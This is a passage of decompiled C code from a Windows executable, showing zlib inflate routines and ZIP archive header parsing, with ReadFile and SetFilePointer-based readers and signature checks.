      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_004083a0(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00407540();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_004083f0(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_004082e0;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(undefined **)(in_EAX + 0x24) = &LAB_00408300;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_00406a70(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x4081a0);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00408310();
      return 0;
    }
    FUN_004083a0();
  }
  return 0xfffffffc;
}



int FUN_004084a0(void)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  byte **in_EAX;
  int iVar5;
  
  if (((in_EAX != (byte **)0x0) && ((uint *)in_EAX[7] != (uint *)0x0)) && (*in_EAX != (byte *)0x0))
  {
    iVar5 = -5;
    uVar2 = *(uint *)in_EAX[7];
    while (uVar2 < 0xe) {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        uVar3 = puVar4[1];
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if (((byte)uVar3 & 0xf) == 8) {
          if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
            *puVar4 = 1;
            goto switchD_004084d6_caseD_1;
          }
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"invalid window size";
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"unknown compression method";
        }
        goto LAB_004086d0;
      case 1:
switchD_004084d6_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar4 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
          if ((bVar1 & 0x20) != 0) {
            *(undefined4 *)in_EAX[7] = 2;
            goto switchD_004084d6_caseD_2;
          }
          *puVar4 = 7;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"incorrect header check";
          *(undefined4 *)(in_EAX[7] + 4) = 5;
        }
        break;
      case 2:
switchD_004084d6_caseD_2:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
      case 3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          iVar5 = 0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_004084d6_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            iVar5 = 0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_004084d6_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return 2;
            }
          }
        }
        return iVar5;
      case 4:
        goto switchD_004084d6_caseD_4;
      case 5:
        goto switchD_004084d6_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)"need dictionary";
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return -2;
      case 7:
        iVar5 = FUN_00406b10(*(void **)(in_EAX[7] + 0x14),iVar5);
        if (iVar5 == -3) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          iVar5 = -3;
        }
        else {
          if (iVar5 == 0) {
            return 0;
          }
          if (iVar5 != 1) {
            return iVar5;
          }
          iVar5 = 0;
          FUN_00406a00();
          puVar4 = (undefined4 *)in_EAX[7];
          if (puVar4[3] == 0) {
            *puVar4 = 8;
            goto switchD_004084d6_caseD_8;
          }
          *puVar4 = 0xc;
        }
        break;
      case 8:
switchD_004084d6_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_004084d6_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_004084d6_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar4[1] == puVar4[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_004084d6_caseD_c:
          return 1;
        }
        *puVar4 = 0xd;
        in_EAX[6] = (byte *)"incorrect data check";
LAB_004086d0:
        iVar5 = 0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_004084d6_caseD_a;
      case 0xb:
        goto switchD_004084d6_caseD_b;
      case 0xc:
        goto switchD_004084d6_caseD_c;
      case 0xd:
        return -3;
      }
      uVar2 = *(uint *)in_EAX[7];
    }
  }
  return -2;
}



uint __fastcall FUN_00408840(undefined4 param_1,void *param_2,uint param_3)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint _Size;
  char *unaff_EDI;
  
  _Size = unaff_EBX * param_3;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 2),param_2,_Size,&param_3,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[6] = '\x01';
    }
    return param_3 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x14);
  if (*(uint *)(unaff_EDI + 0x10) < iVar1 + _Size) {
    _Size = *(uint *)(unaff_EDI + 0x10) - iVar1;
  }
  _memcpy(param_2,(void *)(*(int *)(unaff_EDI + 0xc) + iVar1),_Size);
  *(uint *)(unaff_EDI + 0x14) = *(int *)(unaff_EDI + 0x14) + _Size;
  return _Size / unaff_EBX;
}



undefined4 __cdecl FUN_004088a0(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  byte local_5;
  size_t local_4;
  
  _Size = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x14);
    if (*(uint *)(unaff_ESI + 0x10) < iVar1 + 1U) {
      _Size = *(uint *)(unaff_ESI + 0x10) - iVar1;
    }
    _memcpy(&local_5,(void *)(*(int *)(unaff_ESI + 0xc) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x14) = iVar1 + _Size;
    local_4 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 2),&local_5,1,&local_4,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[6] = '\x01';
    }
  }
  if (local_4 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[6] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_00408930(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_4;
  
  iVar2 = FUN_004088a0(&local_4);
  uVar1 = local_4;
  if (iVar2 == 0) {
    iVar2 = FUN_004088a0(&local_4);
  }
  iVar4 = local_4 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_004088a0(&local_4);
  }
  iVar3 = local_4 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_004088a0(&local_4);
    if (iVar2 == 0) {
      *unaff_EBX = local_4 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_004089b0(void)

{
  int iVar1;
  DWORD DVar2;
  void *_Dst;
  uint uVar3;
  BOOL BVar4;
  int iVar5;
  size_t _Size;
  char *unaff_ESI;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;
  int iStack_4;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x10);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 2),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    uStack_18 = *(uint *)(unaff_ESI + 0x14);
  }
  else if (unaff_ESI[1] == '\0') {
    uStack_18 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 2),0,(PLONG)0x0,1);
    uStack_18 = DVar2 - *(int *)(unaff_ESI + 7);
  }
  uStack_14 = 0xffff;
  if (uStack_18 < 0xffff) {
    uStack_14 = uStack_18;
  }
  _Dst = _malloc(0x404);
  if (_Dst == (void *)0x0) {
    return -1;
  }
  uStack_10 = 4;
  iStack_c = -1;
  if (uStack_14 < 5) {
LAB_00408b61:
    _free(_Dst);
    return iStack_c;
  }
  do {
    uVar3 = uStack_10 + 0x400;
    uStack_10 = uStack_14;
    if (uVar3 <= uStack_14) {
      uStack_10 = uVar3;
    }
    iStack_4 = uStack_18 - uStack_10;
    uVar3 = uStack_18 - iStack_4;
    if (0x404 < uVar3) {
      uVar3 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x14) = iStack_4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_00408b61;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 2),*(int *)(unaff_ESI + 7) + iStack_4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar5 = *(int *)(unaff_ESI + 0x14);
      _Size = uVar3;
      if (*(uint *)(unaff_ESI + 0x10) < iVar5 + uVar3) {
        _Size = *(uint *)(unaff_ESI + 0x10) - iVar5;
      }
      _memcpy(_Dst,(void *)(*(int *)(unaff_ESI + 0xc) + iVar5),_Size);
      *(size_t *)(unaff_ESI + 0x14) = *(int *)(unaff_ESI + 0x14) + _Size;
    }
    else {
      BVar4 = ReadFile(*(HANDLE *)(unaff_ESI + 2),_Dst,uVar3,&uStack_8,(LPOVERLAPPED)0x0);
      _Size = uStack_8;
      if (BVar4 == 0) {
        unaff_ESI[6] = '\x01';
      }
    }
    if (_Size / uVar3 != 1) goto LAB_00408b61;
    iVar5 = uVar3 - 3;
    do {
      iVar1 = iVar5;
      if (iVar1 < 0) goto LAB_00408b4c;
      iVar5 = iVar1 + -1;
    } while ((((*(char *)(iVar5 + (int)_Dst) != 'P') || (*(char *)(iVar1 + (int)_Dst) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)_Dst) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)_Dst) != '\x06'));
    iStack_c = iVar5 + iStack_4;
LAB_00408b4c:
    if ((iStack_c != 0) || (uStack_14 <= uStack_10)) goto LAB_00408b61;
  } while( true );
}



int * FUN_00408b80(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int *piVar8;
  uint uStack_94;
  int local_90;
  int local_8c;
  int local_88;
  int aiStack_84 [7];
  int iStack_68;
  int iStack_64;
  int iStack_60;
  undefined4 uStack_8;
  
  if (in_EAX == (char *)0x0) {
    return (int *)0x0;
  }
  local_90 = 0;
  local_88 = FUN_004089b0();
  if (local_88 == -1) {
    local_90 = -1;
  }
  if (*in_EAX == '\0') {
    *(int *)(in_EAX + 0x14) = local_88;
  }
  else if (in_EAX[1] == '\0') {
    local_90 = -1;
  }
  else {
    SetFilePointer(*(HANDLE *)(in_EAX + 2),*(int *)(in_EAX + 7) + local_88,(PLONG)0x0,0);
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_004088a0(&uStack_94);
  uVar1 = uStack_94;
  iVar6 = 0;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&uStack_94), iVar2 == 0)) {
    local_8c = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_8c = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = FUN_004088a0(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&uStack_94), iVar2 == 0)) {
    iVar6 = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_90 = -1;
  }
  iVar2 = FUN_004088a0(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&uStack_94), iVar2 == 0)) {
    aiStack_84[1] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[1] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = aiStack_84[1];
  iVar3 = FUN_004088a0(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar3 == 0) && (iVar3 = FUN_004088a0(&uStack_94), iVar3 == 0)) {
    iVar5 = uStack_94 * 0x100 + uVar1;
  }
  else {
    iVar5 = 0;
    if (iVar3 != 0) {
      local_90 = -1;
    }
  }
  if (((iVar5 != iVar2) || (iVar6 != 0)) || (local_8c != 0)) {
    local_90 = -0x67;
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_004088a0(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&uStack_94), iVar2 == 0)) {
    aiStack_84[2] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[2] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  if (((uint)(iStack_64 + iStack_60) <= (uint)(*(int *)(in_EAX + 7) + local_88)) && (local_90 == 0))
  {
    aiStack_84[3] = ((*(int *)(in_EAX + 7) - iStack_64) - iStack_60) + local_88;
    iStack_68 = local_88;
    uStack_8 = 0;
    *(undefined4 *)(in_EAX + 7) = 0;
    piVar4 = (int *)_malloc(0x80);
    piVar7 = aiStack_84;
    piVar8 = piVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *piVar8 = *piVar7;
      piVar7 = piVar7 + 1;
      piVar8 = piVar8 + 1;
    }
    FUN_00409260();
    return piVar4;
  }
  if (in_EAX[0xb] != '\0') {
    CloseHandle(*(HANDLE *)(in_EAX + 2));
  }
  FUN_0040a3fc(in_EAX);
  return (int *)0x0;
}



int __cdecl FUN_00408e10(int *param_1,uint *param_2,void *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c;
  uint local_58;
  int aiStack_54 [4];
  uint uStack_44;
  uint uStack_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  int iStack_24;
  int iStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  int iStack_8;
  
  local_5c = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x14) = in_EAX[5] + (int)in_EAX[3];
  }
  else {
    if (pcVar1[1] == '\0') {
      local_5c = -1;
      goto LAB_00408e8f;
    }
    SetFilePointer(*(HANDLE *)(pcVar1 + 2),(LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 7))
                   ,(PLONG)0x0,0);
  }
  iVar2 = FUN_00408930();
  if (iVar2 == 0) {
    if (local_58 != 0x2014b50) {
      local_5c = -0x67;
    }
  }
  else {
    local_5c = -1;
  }
LAB_00408e8f:
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    aiStack_54[0] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[0] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    aiStack_54[1] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[1] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    aiStack_54[2] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[2] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    aiStack_54[3] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[3] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  uStack_10 = uStack_44 >> 0x10 & 0x1f;
  iStack_8 = (uStack_44 >> 0x19) + 0x7bc;
  iStack_c = (uStack_44 >> 0x15 & 0xf) - 1;
  uStack_14 = uStack_44 >> 0xb & 0x1f;
  uStack_18 = uStack_44 >> 5 & 0x3f;
  iStack_1c = (uStack_44 & 0x1f) * 2;
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004088a0(&local_58);
  uStack_34 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    uStack_34 = local_58 * 0x100 + uStack_34;
  }
  else {
    uStack_34 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    iStack_30 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_30 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    iStack_2c = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_2c = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    iStack_28 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_28 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_004088a0(&local_58), iVar2 == 0)) {
    iStack_24 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_24 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00408930();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_5c == 0) {
    if (param_3 != (void *)0x0) {
      if (uStack_34 < param_4) {
        *(undefined *)(uStack_34 + (int)param_3) = 0;
      }
      if (((uStack_34 != 0) && (param_4 != 0)) &&
         (uVar3 = FUN_00408840(param_4,param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = aiStack_54;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_58;
    }
  }
  return local_5c;
}



int FUN_00409260(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_00408e10((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_004092a0(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char **unaff_EDI;
  char *pcStack_8;
  char *local_4;
  
  iVar6 = 0;
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x14) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 2),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 7)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_00408930();
  if (iVar4 == 0) {
    if (local_4 != (char *)0x4034b50) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0((uint *)&local_4);
  if (iVar4 == 0) {
    iVar4 = FUN_004088a0((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00409333;
  }
  else {
LAB_00409333:
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0((uint *)&local_4);
  pcVar5 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_004088a0((uint *)&local_4);
    if (iVar4 != 0) goto LAB_0040936d;
    local_4 = pcVar5 + (int)local_4 * 0x100;
  }
  else {
LAB_0040936d:
    local_4 = (char *)0x0;
    if (iVar4 != 0) {
      iVar6 = -1;
    }
  }
  iVar4 = FUN_004088a0((uint *)&pcStack_8);
  pcVar5 = pcStack_8;
  if (iVar4 == 0) {
    iVar4 = FUN_004088a0((uint *)&pcStack_8);
    if (iVar4 != 0) goto LAB_004093f0;
    pcStack_8 = pcVar5 + (int)pcStack_8 * 0x100;
LAB_004093b1:
    if ((iVar6 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], pcStack_8 != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_004093f0:
    pcStack_8 = (char *)0x0;
    if (iVar4 == 0) goto LAB_004093b1;
    iVar6 = -1;
  }
  iVar4 = FUN_00408930();
  if (iVar4 != 0) {
    iVar6 = -1;
  }
  iVar4 = FUN_00408930();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0xf])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408930();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x10])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408930();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x11])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_004088a0((uint *)&local_4);
    if (iVar4 != 0) goto LAB_004094f6;
    pcVar5 = pcStack_8 + (int)local_4 * 0x100;
LAB_004094a9:
    if ((iVar6 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_004094f6:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_004094a9;
    iVar6 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_004088a0((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_004088a0((uint *)&local_4);
    if (iVar4 == 0) {
      pcStack_8 = pcStack_8 + (int)local_4 * 0x100;
      goto LAB_0040950a;
    }
  }
  pcStack_8 = (char *)0x0;
  if (iVar4 != 0) {
    iVar6 = -1;
  }
LAB_0040950a:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = pcStack_8;
  *param_1 = *param_1 + (int)pcStack_8;
  return iVar6;
}



undefined4 __cdecl FUN_00409530(char *param_1)

{
  void **in_EAX;
  int iVar1;
  void **_Memory;
  void *pvVar2;
  uint *puVar3;
  uint *extraout_EDX;
  char *local_c;
  char *local_8;
  char *local_4;
  
  if ((in_EAX == (void **)0x0) || (in_EAX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (void *)0x0) {
    FUN_00409910();
  }
  iVar1 = FUN_004092a0(&local_4,&local_c,&local_8);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)_malloc(0x7e);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_c;
    _Memory[0x12] = local_8;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = in_EAX[0xd];
      _Memory[0x15] = in_EAX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = in_EAX[0xd];
      _Memory[0x18] = *in_EAX;
      _Memory[0x1a] = in_EAX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_004083f0();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = in_EAX[0x10];
      _Memory[0x17] = in_EAX[0x11];
